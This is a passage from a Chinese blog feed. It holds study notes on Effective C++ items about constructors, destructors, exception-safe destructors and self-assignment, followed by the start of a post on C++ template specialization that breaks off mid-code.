class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">priority</span><span class="params">()</span> </span>;<span class="comment">//优先级函数，构造函数是个explicit构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">processWidget</span><span class="params">(std::shared_ptr&lt;Widget&gt; pw, <span class="type">int</span> priority)</span></span>;<span class="comment">//进行带优先级的处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//理想调用顺序：调用priority-&gt;执行“new Widget”-&gt;std::shared_ptr</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">processWidget</span>(<span class="keyword">new</span> Widget， <span class="built_in">priority</span>());<span class="comment">//因原始指针和智能指针不匹配，error！</span></span><br><span class="line"><span class="built_in">processWidget</span> (std::<span class="built_in">shared_ptr</span>&lt;Widget&gt;(<span class="keyword">new</span> Widget), <span class="built_in">priority</span>());<span class="comment">//正确调用，但是会因为参数调用顺序而产生异常</span></span><br><span class="line"><span class="comment">//如：调用执行“new Widget”-&gt;priority-&gt;std::shared_ptrnew返回的指针会丢失</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::shared_ptr&lt;Widget&gt; <span class="title">pw</span><span class="params">(<span class="keyword">new</span> Widget)</span></span>; ／／在单独语句内以智能指针存储newed 所得对象。</span><br><span class="line"><span class="built_in">processWidge</span> (pw, <span class="built_in">priority</span>()); ／／这个调用动作绝不至于造成泄漏。</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>以上之所以行得通，因为编译器对于“跨越语句的各项操作“没有重新排列的自由（只有在语句内它才拥有那个自由度）。</li></ul><h4 id="请记住-4"><a href="#请记住-4" class="headerlink" title="请记住"></a>请记住</h4><ul><li>以独立语句将newed 对象存储千（置入）智能指针内。如果不这样做，一旦异常被抛出，有可能导致难以察觉的资源泄漏。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EffectiveCpp0x2</title>
      <link href="/2024/04/03/C&amp;C++/Effective%20Cpp0x2/"/>
      <url>/2024/04/03/C&amp;C++/Effective%20Cpp0x2/</url>
      
        <content type="html"><![CDATA[<h1 id="Effective-C"><a href="#Effective-C" class="headerlink" title="Effective C+"></a>Effective C+</h1><p> [toc]</p><h2 id="Constructors-Destructors-and-Assignment-Operators"><a href="#Constructors-Destructors-and-Assignment-Operators" class="headerlink" title="Constructors,Destructors,and Assignment Operators"></a>Constructors,Destructors,and Assignment Operators</h2><h3 id="05-Know-what-functions-C-silently-writes-and-calls"><a href="#05-Know-what-functions-C-silently-writes-and-calls" class="headerlink" title="05. Know what functions C++ silently writes and calls"></a>05. Know what functions C++ silently writes and calls</h3><ul><li>C++自动为类声明<code>copy构造函数</code>，<code>copy assignment操作符</code>和<code>析构函数</code>。如果没有声明构造函数，编译器会生成<code>default构造函数</code>。 这些函数都是<code>public</code>且<code>inline</code>的。 </li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>()    &#123;&#125; <span class="comment">// Default constructor</span></span><br><span class="line">    ~<span class="built_in">Entity</span>()   &#123;&#125; <span class="comment">// Destructor</span></span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">const</span> Entity&amp; rhs)   &#123;&#125; <span class="comment">// Copy constructor</span></span><br><span class="line">    Entity <span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; rhs)  &#123; <span class="keyword">return</span> *<span class="keyword">this</span>;&#125; <span class="comment">// Copy assignment operator</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Entity e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="06-Explicitly-disallow-the-use-of-compiler-generated-functions-you-do-not-want"><a href="#06-Explicitly-disallow-the-use-of-compiler-generated-functions-you-do-not-want" class="headerlink" title="06. Explicitly disallow the use of compiler-generated functions you do not want"></a>06. Explicitly disallow the use of compiler-generated functions you do not want</h3><ul><li><p>直接<code>delete</code>掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Entity &#123;</span><br><span class="line">private:</span><br><span class="line">    // 禁用默认构造函数</span><br><span class="line">    Entity() = delete;</span><br><span class="line"></span><br><span class="line">    // 禁用拷贝构造函数</span><br><span class="line">    Entity(const Entity&amp;) = delete;</span><br><span class="line"></span><br><span class="line">    // 禁用拷贝赋值运算符</span><br><span class="line">    Entity&amp; operator=(const Entity&amp;) = delete;</span><br><span class="line"></span><br><span class="line">    // 允许声明析构函数，但不提供实现（可选）</span><br><span class="line">    ~Entity();</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    // 其他成员和方法</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="07-Declare-destructors-virtual-in-polymorphic-base-classes"><a href="#07-Declare-destructors-virtual-in-polymorphic-base-classes" class="headerlink" title="07. Declare destructors virtual in polymorphic base classes"></a>07. Declare destructors virtual in polymorphic base classes</h3><ul><li>因为C++明白指出，当<code>derived class对象</code>经由一个<code>base class指针</code>被删除,而该<code>base class</code>带着一个<code>non-virtual析构函数</code>,其结果<code>未有定义</code>——实际执行时通常发生的是对象的<code>derived成分没被销毁</code>。</li><li><code>vptr(virtual table pointer)</code>指针指出运行期哪一个<code>virtual函数</code>应该被调用。</li><li>不要继承<code>non-virtual类</code>，如<code>std::string</code>、<code>容器类</code>等。他们没有<code>virtual虚构函数</code>。</li><li>析构调用顺序：最深层派生(most derived)的那个class其析构函数最先被调用，然后是每个base class的析构函数被调用。</li></ul><h4 id="请记住"><a href="#请记住" class="headerlink" title="请记住"></a>请记住</h4><ul><li><code>polymorphic (带多态性质的)</code>base classes 应该声明-一个<code>virtual 析构函数</code>。如果class带有任何<code>virtual函数</code>，它就应该拥有一个<code>virtual析构函数</code>。</li><li><code>多态</code>即通过<code>base class接口</code>来处理<code>derived class对象</code>。</li><li>Classes 的设计目的如果不是作为base classes 使用，或<code>不是为了具备多态性(polymorphically)</code>，就<code>不该声明vitual析构函数</code>。</li></ul><h3 id="08-Prevent-exceptions-from-leaving-destructors"><a href="#08-Prevent-exceptions-from-leaving-destructors" class="headerlink" title="08. Prevent exceptions from leaving destructors"></a>08. Prevent exceptions from leaving destructors</h3><ul><li>C++并不禁止析构函数吐出异常，但它不鼓励你这样做。</li><li>在两个异常同时存在的情况下，程序若不是结束执行就是导致不明确行为:在两个异常同时存在的情况下，程序若不是结束执行就是导致不明确行为</li></ul><blockquote><p>GPT3.5：如何理解在两个异常同时存在的情况下，程序若不是结束执行就是导致不明确行为</p><ol><li><strong>异常链</strong>：当一个异常抛出并且未被捕获时，程序会终止当前的执行，并且尝试在调用栈中查找匹配的<code>catch</code>块。如果在这个过程中，另一个异常被抛出，而且两个异常都没有被捕获，那么程序的行为将变得不明确。这可能导致未定义的行为或者程序终止。</li><li><strong>资源泄漏</strong>：如果一个异常导致了资源泄漏（比如内存泄漏、文件句柄泄漏等），而另一个异常又同时发生，那么程序可能无法正常处理这些异常，进而导致不明确的行为。</li><li><strong>数据破坏</strong>：如果一个异常导致了数据的破坏，而另一个异常又同时发生，那么程序可能无法正确处理这些异常，从而导致数据损坏或者不一致性。</li></ol></blockquote><ul><li><p>在如关闭文件，关闭数据库的连接，可能抛出异常，我们有两种解决方案：</p></li><li><ol><li><p>如果close 抛出异常就结束程序。通常通过调用abort 完成：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~<span class="built_in">Destruction</span>() &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试关闭资源。</span></span><br><span class="line">        <span class="built_in">close</span>();</span><br><span class="line">    &#125; <span class="built_in">catch</span>(...) &#123; <span class="comment">// 捕获所有类型的异常</span></span><br><span class="line">        <span class="comment">// 如果关闭操作失败，则记录日志</span></span><br><span class="line">        <span class="built_in">log</span>();</span><br><span class="line">        <span class="comment">// 然后终止程序</span></span><br><span class="line">        std::<span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><ol><li><p>吞下因调用close 而发生的异常:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~<span class="built_in">Destruction</span>() &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试关闭资源。</span></span><br><span class="line">           <span class="built_in">close</span>();</span><br><span class="line">       &#125; <span class="built_in">catch</span>(...) &#123; </span><br><span class="line">           <span class="comment">// 如果关闭操作失败，则记录日志</span></span><br><span class="line">           <span class="built_in">log</span>();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>较佳策略</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Destruction</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ~<span class="built_in">Destruction</span>() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试关闭资源。</span></span><br><span class="line">            <span class="built_in">close</span>();</span><br><span class="line">        &#125; <span class="built_in">catch</span>(...) &#123; </span><br><span class="line">            <span class="comment">// 如果关闭操作失败，记录日志，吞下异常.</span></span><br><span class="line">            <span class="built_in">log</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 提供客户一个close()函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">log</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 实现日志记录逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h4 id="请记住-1"><a href="#请记住-1" class="headerlink" title="请记住"></a>请记住</h4><ul><li>析构函数绝对不要吐出异常。如果一个被析构函数调用的函数可能抛出异常，析构函数应该捕捉任何异常，然后吞下它们（不传播）或结束程序。</li><li>如果客户需要对某个操作函数运行期间抛出的异常做出反应，那么class 应该提供一个普通函数（而非在析构函数中）执行该操作。</li></ul><h3 id="09-Never-call-virtual-functions-during-construction-or-destruction"><a href="#09-Never-call-virtual-functions-during-construction-or-destruction" class="headerlink" title="09. Never  call  virtual functions during construction or destruction"></a>09. Never  call  virtual functions during construction or destruction</h3><ul><li>有点难懂，百度</li></ul><p>//TODO</p><h3 id="10-Have-assignment-operators-return-a-reference-to-this"><a href="#10-Have-assignment-operators-return-a-reference-to-this" class="headerlink" title="10. Have assignment operators return a reference to *this"></a>10. Have assignment operators return a reference to *this</h3><ul><li>赋值采用右结合律。要实现连锁赋值，要返回一个<code>reference</code>指向操作符的左侧实参。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span> &#123;</span><br><span class="line">    <span class="comment">// 重载赋值操作符</span></span><br><span class="line">    Entity&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; e) &#123;</span><br><span class="line">        <span class="comment">// 返回*this允许链式赋值</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="请记住-2"><a href="#请记住-2" class="headerlink" title="请记住"></a>请记住</h4><ul><li>令赋值(assignment) 操作符返回一个reference to *this。</li></ul><h3 id="11-handle-assignment-to-self-in-operator"><a href="#11-handle-assignment-to-self-in-operator" class="headerlink" title="11. handle assignment to self in operator="></a>11. handle assignment to self in operator=</h3><ul><li>证同测试(identity test)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>(<span class="type">int</span> a,<span class="type">int</span> b)</span><br><span class="line">    &#123;</span><br><span class="line">        value = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">2</span>];</span><br><span class="line">        value[<span class="number">0</span>] = a;</span><br><span class="line">        value[<span class="number">1</span>] = b;</span><br><span class="line">        std::cout&lt;&lt; <span class="string">&quot;Construction!!!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Entity</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> []value;</span><br><span class="line">        std::cout&lt;&lt; <span class="string">&quot;Destruction!!!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">  Entity&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; rhs);</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span>* value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Entity&amp; Entity::<span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; rhs)        </span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span> != &amp;rhs) &#123;</span><br><span class="line">            value[<span class="number">0</span>] = rhs.value[<span class="number">0</span>];</span><br><span class="line">            value[<span class="number">1</span>] = rhs.value[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Entity::print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     std::cout&lt;&lt; <span class="keyword">this</span>-&gt;value[<span class="number">0</span>] &lt;&lt;  <span class="string">&quot; &quot;</span> &lt;&lt;<span class="keyword">this</span>-&gt;value[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">Entity <span class="title">e</span><span class="params">(<span class="number">123</span>, <span class="number">456</span>)</span></span>;</span><br><span class="line">    <span class="function">Entity <span class="title">e1</span><span class="params">(<span class="number">789</span>, <span class="number">123</span>)</span></span>;</span><br><span class="line">    e = e1;</span><br><span class="line">    e.<span class="built_in">print</span>();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>复制前先别删除</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Entity&amp; Entity::<span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; rhs)        </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//遵循了异常安全的原则，特别是提供了强异常安全保证。</span></span><br><span class="line">   <span class="comment">// 异常安全：如果在new分配内存时发生异常，当前对象的状态不会改变，因为它仍然保持着对原始内存的控制。新内存的分配和初始化发生在任何旧资源被释放之前。</span></span><br><span class="line">     <span class="type">int</span>* tmp = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">2</span>];</span><br><span class="line">     tmp[<span class="number">0</span>] = rhs.value[<span class="number">0</span>];</span><br><span class="line">     tmp[<span class="number">1</span>] = rhs.value[<span class="number">1</span>];</span><br><span class="line">     <span class="keyword">delete</span> []value;</span><br><span class="line">     value = tmp;</span><br><span class="line">     <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//也许不是最高效的方法，但是行得通</span></span><br></pre></td></tr></table></figure><ul><li>copy and swap</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Entity&amp; Entity::<span class="keyword">operator</span>=(<span class="type">const</span> Entity&amp; rhs) &#123;</span><br><span class="line">    <span class="comment">// 创建一个临时的Entity对象，并用rhs的值初始化它</span></span><br><span class="line">    Entity <span class="built_in">tmp</span>(rhs.value[<span class="number">0</span>], rhs.value[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用swap方法交换临时对象和当前对象的值</span></span><br><span class="line">    <span class="built_in">swap</span>(tmp);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回当前对象的引用，支持链式赋值</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Entity::swap</span><span class="params">(Entity &amp;rhs)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建两个临时变量，用于暂存值</span></span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    <span class="comment">// 将rhs对象的值赋给临时变量a和b</span></span><br><span class="line">    a = rhs.value[<span class="number">0</span>];</span><br><span class="line">    b = rhs.value[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 交换rhs对象和当前对象的值</span></span><br><span class="line">    rhs.value[<span class="number">0</span>] = <span class="keyword">this</span>-&gt;value[<span class="number">0</span>];</span><br><span class="line">    rhs.value[<span class="number">1</span>] = <span class="keyword">this</span>-&gt;value[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">this</span>-&gt;value[<span class="number">0</span>] = a;</span><br><span class="line">    <span class="keyword">this</span>-&gt;value[<span class="number">1</span>] = b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>确保当对象自我赋值时operator= 有良好行为。其中技术包括比较”来源对象”和“目标对象”的地址、精心周到的语句顺序、以及copy-and-swap 。</li><li>确定任何函数如果操作一个以上的对象，而其中多个对象是同一个对象时，其行为仍然正确。</li></ul><h3 id="12-Copy-all-parts-of-an-object"><a href="#12-Copy-all-parts-of-an-object" class="headerlink" title="12. Copy all parts of an object."></a>12. Copy all parts of an object.</h3><p>1) 复制所有local 成员变量。<br>2)  调用所有base classes 内的适当的copying 函数。</p><h4 id="请记住-3"><a href="#请记住-3" class="headerlink" title="请记住"></a>请记住</h4><ul><li>Copying 函数应该确保复制”对象内的所有成员变量”及“所有base class 成分”。</li><li>不要尝试以某个copying 函数实现另一个copying 函数。应该将共同机能放进第三个函数中，并由两个copying 函数共同调用。</li></ul>]]></content>
      
      
      <categories>
          
          <category> cpp </category>
          
          <category> effective cpp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> effective cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>template</title>
      <link href="/2024/04/02/C&amp;C++/templates/"/>
      <url>/2024/04/02/C&amp;C++/templates/</url>
      
        <content type="html"><![CDATA[<h1 id="template"><a href="#template" class="headerlink" title="template"></a>template</h1><h3 id="templates的基本用法"><a href="#templates的基本用法" class="headerlink" title="templates的基本用法"></a>templates的基本用法</h3><ul><li><p>编译器根据你提供的规则为你编写代码。</p></li><li><p>模板定义本身不参与编译，而是编译器根据模板的用户使用模板时提供的类型参数生成代码，再进行编译。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(T value)</span><span class="comment">//函数模板</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; value &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="type">int</span> N&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Array</span><span class="comment">//类模板</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">T m_Array[N];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetSize</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> N;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Array&lt;<span class="type">int</span>, <span class="number">5</span>&gt; array;</span><br><span class="line">std::cout &lt;&lt; array.<span class="built_in">GetSize</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Print</span>(<span class="number">123</span>);</span><br><span class="line"><span class="built_in">Print</span>(<span class="string">&quot;Randolfluo&quot;</span>);</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类模板的全特化与偏特化"><a href="#类模板的全特化与偏特化" class="headerlink" title="类模板的全特化与偏特化"></a>类模板的全特化与偏特化</h3><ul><li>全特化是指对模板的所有模板参数进行特化。即限定全部参数。</li><li>偏特化是指对模板的一部分模板参数进行特化。即限定部分参数。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T0,<span class="keyword">typename</span> T1&gt;<span class="comment">//原始模板类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>(T0 a, T1 b)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Primary Template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T0).<span class="built_in">name</span>() &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; <span class="built_in">typeid</span>(T1).<span class="built_in">name</span>() &lt;&lt; <span class="string">&quot;&gt;: &quot;</span>  &lt;&lt; a &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; b &lt;&lt; std::endl &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;<span class="comment">//全特化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span>&lt;<span class="type">float</span>,<span 